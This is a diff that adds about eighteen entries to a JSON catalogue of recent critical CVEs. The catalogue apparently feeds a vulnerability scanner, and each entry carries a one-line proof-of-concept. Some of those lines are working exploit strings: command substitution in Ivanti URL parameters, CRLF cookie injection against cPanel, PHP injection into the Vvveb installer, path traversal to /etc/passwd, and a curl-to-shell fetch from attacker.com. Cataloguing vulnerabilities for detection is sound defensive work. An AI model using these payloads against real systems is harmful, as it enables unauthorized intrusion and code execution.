@@ -614,5 +614,203 @@
     "description": "Credenciales por defecto cobbler/cobbler nunca se cambian → RCE pre-auth via XMLRPC.",
     "poc": "POST /cobbler_api con login(cobbler, cobbler) → ejecutar API methods",
     "ref": "https://nvd.nist.gov/vuln/detail/CVE-2024-47533"
+  },
+  {
+    "cve": "CVE-2026-3854",
+    "cve_family": "github-enterprise",
+    "tech_match": "GitHub Enterprise Server",
+    "versions_affected": "<3.14.24,3.15.0-3.15.18,3.16.0-3.16.14,3.17.0-3.17.11,3.18.0-3.18.5,3.19.0-3.19.2",
+    "severity": "critical",
+    "title": "GitHub Enterprise Server — git push X-Stat header injection RCE",
+    "description": "babeld (GitHub's internal git proxy) fails to sanitize push-option values before embedding them into internal X-Stat service headers (semicolon-delimited). Authenticated user with push access can inject custom_hooks_dir + repo_pre_receive_hooks fields, achieving arbitrary command execution as the git service user. Wiz disclosed 2026-03-04, public 2026-04-28; 88% of GHES instances unpatched at disclosure.",
+    "poc": "git push -o 'rails_env=development;custom_hooks_dir=/tmp/h;repo_pre_receive_hooks=evil' origin main",
+    "ref": "https://www.wiz.io/blog/github-rce-vulnerability-cve-2026-3854"
+  },
+  {
+    "cve": "CVE-2026-23918",
+    "cve_family": "apache",
+    "tech_match": "Apache HTTPd",
+    "versions_affected": "2.4.66",
+    "severity": "high",
+    "title": "Apache httpd 2.4.66 mod_http2 — double-free in h2_mplx.c stream cleanup (DoS / RCE)",
+    "description": "HTTP/2 HEADERS frame followed by RST_STREAM with non-zero error code on the same stream triggers duplicate cleanup → double-free in mod_http2. Trivial DoS on any default deployment with mod_http2 + multi-threaded MPM; RCE possible when APR uses mmap allocator (Debian + official Docker images). MPM prefork unaffected. Disclosed 2026-05-05.",
+    "poc": "Send HTTP/2 HEADERS frame followed immediately by RST_STREAM(error=CANCEL) on stream 1 — repeat → worker crash. Exploit framework: nghttp2 + custom client.",
+    "ref": "https://nvd.nist.gov/vuln/detail/CVE-2026-23918"
+  },
+  {
+    "cve": "CVE-2026-41940",
+    "cve_family": "cpanel",
+    "tech_match": "cPanel WHM",
+    "versions_affected": "<11.136.0.5",
+    "severity": "critical",
+    "title": "cPanel & WHM — CRLF injection in session writer → unauth admin bypass",
+    "description": "cpsrvd writes a session file to disk before authentication. Malformed whostmgrsession cookie skips encryption; \\r\\n injected into pass= field promotes attacker to authenticated admin. CISA KEV; ~1.5M instances exposed; in-the-wild exploitation since 2026-02-23. Disclosed 2026-04-28.",
+    "poc": "GET /cpsess0000/ HTTP/1.1\\nHost: target:2087\\nCookie: whostmgrsession=root%3a<truncated>%0d%0apass%3dauth%0d%0auid%3d0",
+    "ref": "https://labs.watchtowr.com/the-internet-is-falling-down-falling-down-falling-down-cpanel-whm-authentication-bypass-cve-2026-41940/"
+  },
+  {
+    "cve": "CVE-2026-4670",
+    "cve_family": "moveit",
+    "tech_match": "Progress MOVEit Automation",
+    "versions_affected": "<2024.1.8,2025.0.0-2025.0.8,2025.1.0-2025.1.4",
+    "severity": "critical",
+    "title": "MOVEit Automation — pre-auth backend command port bypass → admin takeover",
+    "description": "Crafted request to MOVEit Automation backend command port is processed before any authentication logic, granting unauthenticated remote attacker full administrative control over file-transfer workflows. CVSS 9.8. Disclosed 2026-05-04.",
+    "poc": "Crafted SOAP/JSON-RPC request to /Admin endpoint on MOVEit Automation service port (default 8080/8443) bypasses login flow.",
+    "ref": "https://www.helpnetsecurity.com/2026/05/04/critical-moveit-automation-auth-bypass-vulnerability-fixed-cve-2026-4670/"
+  },
+  {
+    "cve": "CVE-2026-1281",
+    "cve_family": "ivanti-epmm",
+    "tech_match": "Ivanti EPMM",
+    "versions_affected": "<12.0.0.x patched build,<12.1.0.x patched build",
+    "severity": "critical",
+    "title": "Ivanti EPMM — bash arithmetic-expansion RCE via /mifs/c/appstore/fob/ params",
+    "description": "Legacy bash script /mi/bin/map-appstore-url uses st and h URL parameters in arithmetic context — bash command substitution executes attacker payload as the Tomcat user. Pre-auth RCE; actively exploited in the wild against gov/healthcare/manufacturing. CISA KEV. CVSS 9.8.",
+    "poc": "GET /mifs/c/appstore/fob/?st=$(id>/tmp/p)&h=1 HTTP/1.1",
+    "ref": "https://unit42.paloaltonetworks.com/ivanti-cve-2026-1281-cve-2026-1340/"
+  },
+  {
+    "cve": "CVE-2026-1340",
+    "cve_family": "ivanti-epmm",
+    "tech_match": "Ivanti EPMM",
+    "versions_affected": "<12.0.0.x patched build,<12.1.0.x patched build",
+    "severity": "critical",
+    "title": "Ivanti EPMM — bash injection RCE via /mifs/c/aftstore/fob/ (Android File Transfer)",
+    "description": "Same root cause as CVE-2026-1281 (unsafe bash interpolation) but in /mi/bin/map-aft-store-url script. Pre-auth RCE via crafted GET requests to /mifs/c/aftstore/fob/ endpoint.",
+    "poc": "GET /mifs/c/aftstore/fob/?st=$(curl%20attacker.com/sh|sh)&h=1 HTTP/1.1",
+    "ref": "https://unit42.paloaltonetworks.com/ivanti-cve-2026-1281-cve-2026-1340/"
+  },
+  {
+    "cve": "CVE-2026-35616",
+    "cve_family": "forticlient-ems",
+    "tech_match": "Fortinet FortiClient EMS",
+    "versions_affected": "7.4.5,7.4.6",
+    "severity": "critical",
+    "title": "FortiClient EMS — pre-auth API access bypass → RCE",
+    "description": "Improper access control in FortiClient EMS API allows crafted requests to bypass authentication and authorization, achieving code execution on the underlying server. Active exploitation detected 2026-03-31; advisory 2026-04-04; CISA KEV 2026-04-06. Patch 7.4.7. CVSS 9.1.",
+    "poc": "POST /api/v1/management/admin (with crafted Authorization header / missing token) → privileged action accepted.",
+    "ref": "https://watchtowr.com/resources/fortinet-forticlient-ems-zero-day-cve-2026-35616-active-exploitation-underway/"
+  },
+  {
+    "cve": "CVE-2026-2699",
+    "cve_family": "sharefile",
+    "tech_match": "Progress ShareFile",
+    "versions_affected": "<5.12.4",
+    "severity": "high",
+    "title": "ShareFile Storage Zone Controller — auth bypass via Response.Redirect(false) on /ConfigService/Admin.aspx",
+    "description": "Authentication check uses httpContext.Response.Redirect(redirectPath, false) — second arg false means execution continues after redirect (Execution After Redirect, CWE-698). Attacker can reach admin endpoints despite redirect to login.",
+    "poc": "GET /ConfigService/Admin.aspx → 302 redirect but body still served; modify Network Share Location to webroot path.",
+    "ref": "https://labs.watchtowr.com/youre-not-supposed-to-sharefile-with-everyone-progress-sharefile-pre-auth-rce-chain-cve-2026-2699-cve-2026-2701/"
+  },
+  {
+    "cve": "CVE-2026-2701",
+    "cve_family": "sharefile",
+    "tech_match": "Progress ShareFile",
+    "versions_affected": "<5.12.4",
+    "severity": "critical",
+    "title": "ShareFile Storage Zone Controller — webshell upload via ZIP unzip=true on /upload.aspx",
+    "description": "Chained with CVE-2026-2699: after pointing Network Share Location at webroot, attacker uploads ZIP containing .aspx via /upload.aspx?unzip=true — files extracted preserving extension → RCE. Requires HMAC-SHA256 + AES Zone Secret (decryptable via hardcoded salt p3510060xfZ2s9). Patched in 5.12.4 (2026-03-10).",
+    "poc": "POST /StorageCenter/Upload.aspx?unzip=true&uploadid=X HTTP/1.1\\nContent-Type: multipart/form-data; …\\n[ZIP containing shell.aspx]",
+    "ref": "https://labs.watchtowr.com/youre-not-supposed-to-sharefile-with-everyone-progress-sharefile-pre-auth-rce-chain-cve-2026-2699-cve-2026-2701/"
+  },
+  {
+    "cve": "CVE-2026-39918",
+    "cve_family": "vvveb",
+    "tech_match": "Vvveb CMS",
+    "versions_affected": "<1.0.8.1",
+    "severity": "critical",
+    "title": "Vvveb — unauth code injection via subdir param in installer (env.php)",
+    "description": "Installation endpoint writes the subdir POST parameter unsanitized into env.php inside a define() statement. Attacker terminates the string context and injects arbitrary PHP — executes on every subsequent request that loads env.php. Pre-auth RCE as web user. CVSS 9.8. Disclosed 2026-04-20.",
+    "poc": "POST /install/index.php\\n…\\nsubdir=foo'); system($_GET['c']); //",
+    "ref": "https://nvd.nist.gov/vuln/detail/CVE-2026-39918"
+  },
+  {
+    "cve": "CVE-2026-32201",
+    "cve_family": "sharepoint",
+    "tech_match": "SharePoint",
+    "versions_affected": "Subscription Edition,2019,2016 (April 2026 Patch Tuesday and earlier)",
+    "severity": "high",
+    "title": "SharePoint — improper input validation spoofing zero-day (exploited in the wild)",
+    "description": "Improper input validation in SharePoint allows unauthorized attacker to perform spoofing over network — confidentiality + integrity impact, no availability. Microsoft confirmed 'Exploitation Detected' on April 2026 Patch Tuesday. CVSS 6.5 but actively exploited.",
+    "poc": "Crafted request to SharePoint endpoint with manipulated input fields exploits validation gap to spoof identity / access sensitive resources.",
+    "ref": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-32201"
+  },
+  {
+    "cve": "CVE-2026-42880",
+    "cve_family": "argocd",
+    "tech_match": "ArgoCD",
+    "versions_affected": "3.2.0-3.2.10,3.3.0-3.3.8",
+    "severity": "critical",
+    "title": "Argo CD — ServerSideDiff endpoint leaks plaintext Kubernetes Secrets",
+    "description": "ServerSideDiff is the only Argo CD endpoint that does NOT call hideSecretData(). If Application has annotation argocd.argoproj.io/compare-options: IncludeMutationWebhook=true, raw Kubernetes SSA dry-run response (containing real Secret values from etcd) is returned unmasked to any read-only user via grpc-web. CVSS 9.6. Patches 3.2.11, 3.3.9.",
+    "poc": "POST grpc-web call to /application.ApplicationService/GetApplicationSyncWindows or ServerSideDiff endpoint as read-only user → response includes base64-decoded Secret data.",
+    "ref": "https://github.com/argoproj/argo-cd/security/advisories/GHSA-3v3m-wc6v-x4x3"
+  },
+  {
+    "cve": "CVE-2025-55182",
+    "cve_family": "react",
+    "tech_match": "React",
+    "versions_affected": "react-server-dom-parcel,react-server-dom-turbopack,react-server-dom-webpack 19.0.0,19.1.0,19.1.1,19.2.0",
+    "severity": "critical",
+    "title": "React Server Components — pre-auth RCE via unsafe deserialization of Server Function payloads",
+    "description": "react-server-dom-* unsafely deserializes payloads from HTTP requests to Server Function endpoints (CWE-502). Pre-auth RCE; attributed to china-nexus 'react2shell' campaign. CISA KEV (2025-12-05). CVSS 10.0.",
+    "poc": "POST to a Server Function endpoint with crafted RSC payload triggering JS object deserialization → arbitrary code in node process.",
+    "ref": "https://nvd.nist.gov/vuln/detail/CVE-2025-55182"
+  },
+  {
+    "cve": "CVE-2026-1492",
+    "cve_family": "wordpress",
+    "tech_match": "WordPress",
+    "versions_affected": "User Registration & Membership plugin <=5.1.2",
+    "severity": "critical",
+    "title": "WP User Registration & Membership — auth bypass / privilege escalation to admin",
+    "description": "Improper Privilege Management (CWE-269) in User Registration & Membership WordPress plugin lets remote attacker gain full administrative access without valid credentials. CVSS 9.8.",
+    "poc": "POST /wp-admin/admin-ajax.php?action=user_registration_membership_register with crafted role/user_id parameters bypasses capability checks.",
+    "ref": "https://nvd.nist.gov/vuln/detail/CVE-2026-1492"
+  },
+  {
+    "cve": "CVE-2026-1357",
+    "cve_family": "wordpress",
+    "tech_match": "WordPress",
+    "versions_affected": "WPvivid Backup & Migration plugin (early 2026 versions, see vendor)",
+    "severity": "critical",
+    "title": "WP WPvivid Backup & Migration — unauth arbitrary PHP file upload → RCE",
+    "description": "Missing authorization on file upload endpoint of WPvivid Backup & Migration plugin allows unauthenticated attacker to upload and execute arbitrary PHP files. CVSS 9.8.",
+    "poc": "POST /wp-admin/admin-ajax.php?action=wpvivid_upload_files with multipart PHP shell payload.",
+    "ref": "https://www.indusface.com/blog/cve-2026-1357-wordpress-rce-wpvivid-plugin/"
+  },
+  {
+    "cve": "CVE-2026-1830",
+    "cve_family": "wordpress",
+    "tech_match": "WordPress",
+    "versions_affected": "Quick Playground plugin <=1.3.1",
+    "severity": "critical",
+    "title": "WP Quick Playground — unauth arbitrary file upload via REST + sync code",
+    "description": "Insufficient authorization on REST API endpoints exposes a sync code; attacker retrieves it then uploads arbitrary PHP via path traversal → unauth RCE. Affects all versions ≤1.3.1.",
+    "poc": "GET /wp-json/quick-playground/v1/sync-code → sync_code; POST /wp-json/quick-playground/v1/upload?path=../../../shell.php (with sync_code header) and PHP body.",
+    "ref": "https://www.sentinelone.com/vulnerability-database/cve-2026-1830/"
+  },
+  {
+    "cve": "CVE-2026-3584",
+    "cve_family": "wordpress",
+    "tech_match": "WordPress",
+    "versions_affected": "Kali Forms plugin (2026 vulnerable releases — see Wordfence advisory)",
+    "severity": "critical",
+    "title": "WP Kali Forms — unauth RCE actively exploited in the wild (CVSS 9.8)",
+    "description": "Kali Forms WordPress plugin allows unauthenticated remote code execution; mass-exploitation observed. CVSS 9.8. Wordfence reported active campaigns.",
+    "poc": "POST /wp-admin/admin-ajax.php?action=kaliforms_form_submit with crafted form payload triggering unsafe field handler.",
+    "ref": "https://securityonline.info/kali-forms-vulnerability-wordpress-rce-cve-2026-3584/"
+  },
+  {
+    "cve": "CVE-2026-34619",
+    "cve_family": "coldfusion",
+    "tech_match": "Adobe ColdFusion",
+    "versions_affected": "<=2023.18,<=2025.6",
+    "severity": "high",
+    "title": "Adobe ColdFusion — path traversal allowing access outside intended scope",
+    "description": "Improper limitation of pathname to a restricted directory (CWE-22) in Adobe ColdFusion 2023.18 / 2025.6 and earlier. Low-priv attacker bypasses controls to read files / cause DoS. Patched in CF 2025 Update 7 / 2023 Update 19 (April 2026 Patch Tuesday). CVSS 7.7.",
+    "poc": "GET /CFIDE/administrator/<endpoint>?path=..%2f..%2f..%2fetc%2fpasswd HTTP/1.1",
+    "ref": "https://helpx.adobe.com/security/products/coldfusion/apsb26-38.html"
   }
 ]
